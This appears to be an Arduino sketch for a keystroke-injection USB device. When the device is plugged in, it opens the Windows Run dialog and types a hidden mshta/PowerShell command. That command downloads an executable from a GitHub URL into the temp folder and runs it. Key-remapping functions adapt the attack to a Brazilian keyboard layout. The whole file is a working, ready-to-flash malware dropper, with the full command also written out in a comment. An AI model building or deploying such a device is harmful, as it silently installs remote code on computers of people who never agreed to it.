#include <Keyboard.h>

String location = "https://github.com/vayc/self/raw/main/setup.exe";
String output = "$env:TEMP/rr.exe";
String kidScript = "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -NoLogo -Command \"\"\"\"Invoke-Webrequest -URI " + location + " -OutFile " + output + "; Start-Process " + output + "\"\"\"\"\"\", 0 : window.close\")"; 

// mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -NoLogo -Command """"Invoke-Webrequest -URI https://github.com/vayc/self/raw/main/setup.exe -OutFile $env:TEMP/rr.exe; Start-Process $env:TEMP/rr.exe"""""", 0 : window.close")
// max caracters = 259

// 0 = en_US
// 1 = pt_BR
int KeycordeLanguageCode = 1;  

void setup() {
  Keyboard.begin();
  delay(2000);
  WinExecute();
  delay(1000);
  Writer(kidScript);
  Keyboard.print("\n");
  Keyboard.end();
}

void WinExecute () {
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(300);
  Keyboard.releaseAll();
}

void QuotationMark () {
  switch (KeycordeLanguageCode) {
    case 1:
      Keyboard.write(126);
      break;
    default:
      Keyboard.write(34);
      break;
  }
}

void DoublePointers () {
  switch (KeycordeLanguageCode) {
    case 1:
      Keyboard.write(63);
      break;
    default:
      Keyboard.write(58);
      break;
  }
}

void CommaPointer () {
  switch (KeycordeLanguageCode) {
    case 1:
      Keyboard.write(47);
      break;
    default:
      Keyboard.write(59);
      break;
  }
}

void FowardSlash () {
  switch (KeycordeLanguageCode) {
    case 1:
      Keyboard.write(KEY_KP_SLASH);
      break;
    default:
      Keyboard.write(47);
      break;
  }
}

void BackSlash () {
  switch (KeycordeLanguageCode) {
    case 1:
      Keyboard.write(48);
      break;
    default:
      Keyboard.write(48);
      break;
  }
}

void Writer (String Str) {
  while(Str.length() > 0) {
    String Current = Str.substring(0, 1);
    if (Current == '/' | Current == "/") {
      FowardSlash();
    } else if (Current == '\\' | Current == "\\") {
      BackSlash();
    } else if (Current == ':' | Current == ":") {
      DoublePointers();
    } else if (Current == ';' | Current == ";") {
      CommaPointer();
    } else if (Current == '"' | Current == "\"") {
      QuotationMark();
    } else {
      Keyboard.print(Current);
    }
    Str.remove(0, 1);
  }
}

void loop() {
  // nothing happens after setup
}